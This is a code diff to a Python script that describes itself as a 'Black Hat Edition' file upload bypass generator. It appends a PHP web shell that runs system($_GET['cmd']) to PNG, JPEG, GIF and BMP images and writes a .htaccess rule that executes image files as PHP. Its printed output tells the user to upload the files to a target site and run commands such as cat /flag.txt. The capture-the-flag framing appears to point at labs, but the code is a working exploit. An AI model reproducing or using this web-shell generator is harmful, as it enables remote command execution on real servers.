@@ -11,7 +11,7 @@ def parse_ratio(s: str):
     w, h = s.split(':')
     return int(w), int(h)
 
-def generate_polyglot_image(path: str, size: tuple, file_extension: str, php_payload: str = "<?php system($_GET['cmd']); ?>"):
+def generate_polyglot_image(path: str, size: tuple, file_extension: str, php_payload: str = "<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); die(); } ?>"):
     """
     Generates an image that is also a valid PHP shell.
     """
@@ -22,21 +22,34 @@ def generate_polyglot_image(path: str, size: tuple, file_extension: str, php_pay
     for i in range(10):
         img.putpixel((random.randint(0, w-1), random.randint(0, h-1)), (random.randint(1,255), random.randint(1,255), random.randint(1,255)))
 
-    if file_extension.lower().endswith(('.jpg', '.jpeg')):
+    # Save based on the image format determined from the final extension
+    if file_extension.lower() in ('.jpg', '.jpeg'):
         img.save(path, format="JPEG")
         with open(path, 'ab') as f:
             f.write(php_payload.encode())
-    else:
-        img.save(path, format=file_extension.replace('.', '').upper())
+    elif file_extension.lower() == '.gif':
+        img.save(path, format="GIF")
+        with open(path, 'ab') as f:
+            f.write(php_payload.encode())
+    elif file_extension.lower() == '.bmp':
+        img.save(path, format="BMP")
+        with open(path, 'ab') as f:
+            f.write(php_payload.encode())
+    else: # Default to PNG
+        img.save(path, format="PNG")
+        with open(path, 'ab') as f:
+            f.write(php_payload.encode())
 
 def main():
-    parser = argparse.ArgumentParser(description="🔥 Advanced File Upload Bypass Generator - Black Hat Edition 🔥")
-    parser.add_argument('--ratio', type=parse_ratio, required=True, help="Width:Height ratio like 2:3")
-    parser.add_argument('--scale', type=int, default=100, help="Scale factor for pixel size")
-    parser.add_argument('--yaml', default='extension.yaml', help="YAML file with patterns")
-    parser.add_argument('--name', default='shell', help="Base name to replace {basename}")
-    parser.add_argument('--payload', default="<?php system($_GET['cmd']); ?>", help="PHP payload to inject")
-    parser.add_argument('--batch', action='store_true', help="Generate ALL patterns without prompting")
+    parser = argparse.ArgumentParser(description="🔥 Advanced File Upload Bypass Generator - Black Hat Edition 🔥", formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument('--ratio', '-r', type=parse_ratio, required=True, help="Image aspect ratio (e.g., '1:1', '4:3', '16:9')")
+    parser.add_argument('--scale', '-s', type=int, default=100, help="Multiplier for ratio to get final size in pixels (default: 100)")
+    parser.add_argument('--yaml', '-y', default='extension.yaml', help="Path to YAML file with bypass patterns (default: extension.yaml)")
+    parser.add_argument('--name', '-n', default='shell', help="Base name to replace {basename} in patterns (default: 'shell')")
+    parser.add_argument('--ext', '-e', default='png', help="Custom extension to use for the image part of the polyglot (e.g., 'png', 'jpg', 'xyz').\nThis is used for the .htaccess rule and final image format. (default: 'png')")
+    parser.add_argument('--payload', '-p', default="<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); die(); } ?>", help="PHP payload to inject. The default will ONLY execute commands and prevent image output.")
+    parser.add_argument('--batch', '-b', action='store_true', help="Generate ALL patterns from the YAML file without prompting")
+
     args = parser.parse_args()
 
     output_dir = "bypass_payloads"
@@ -83,29 +96,21 @@ def main():
 
     for pattern_obj in selected_patterns:
         pattern = pattern_obj["pattern"]
-        filename = pattern.replace("{basename}", args.name)
-        access_url = pattern_obj["access"].replace("{filename}", filename) # Add this line
-
-        # Determine the "real" extension for image generation
-        extensions = filename.split('.')
-        img_ext = '.png' # default
-        for ext in reversed(extensions):
-            if ext.lower() in ['png', 'jpg', 'jpeg', 'gif', 'bmp']:
-                img_ext = f'.{ext}'
-                break
+        filename = pattern.replace("{basename}", args.name).replace("{ext}", args.ext)
+        access_url = pattern_obj["access"].replace("{filename}", filename)
 
         path = os.path.join(output_dir, filename)
         
-        # Check if it's the .htaccess file, which needs special content
         if filename == ".htaccess":
             with open(path, 'w') as f:
-                f.write("AddType application/x-httpd-php .jpg .png .gif\n") # Write the actual .htaccess content
-            print(f"[+] Created: {filename} (HTACCESS RULES)")
+                f.write(f"AddType application/x-httpd-php .{args.ext}\n")
+            print(f"[+] Created: {filename} (HTACCESS RULES for .{args.ext})")
         else:
-            generate_polyglot_image(path, (w, h), img_ext, args.payload)
-            print(f"[+] Created: {filename} ({w}x{h}px)")
+            final_ext = os.path.splitext(filename)[-1].lower()
+            generate_polyglot_image(path, (w, h), final_ext, args.payload)
+            print(f"[+] Created: {filename} ({w}x{h}px, image format: {final_ext})")
         
-        generated_files.append((filename, access_url)) # Store filename and access URL
+        generated_files.append((filename, access_url))
 
     # PRINT THE WINNING INSTRUCTIONS
     print("\n" + "="*60)
@@ -117,10 +122,11 @@ def main():
         print(f"  1. Upload it to the target website.")
         print(f"  2. Try to access it at a URL like:")
         print(f"     -> {access_url}")
-        print(f"  3. Change 'whoami' to other commands like 'cat /flag.txt'")
-        print(f"  4. Capture the flag! 🏴‍☠️")
+        print(f"  3. Add '?cmd=whoami' to the URL and test it.")
+        print(f"  4. Change 'whoami' to other commands like 'cat /flag.txt'")
+        print(f"  5. Capture the flag! 🏴‍☠️")
     
-    print("\nPro Tip: Use Burp Suite or OWASP ZAP to automate the upload of all these files!")
+    print("\nPro Tip: Use Burp Suite Intruder or Turbo Intruder to automate the upload of all these files!")
 
 if __name__ == "__main__":
     main()
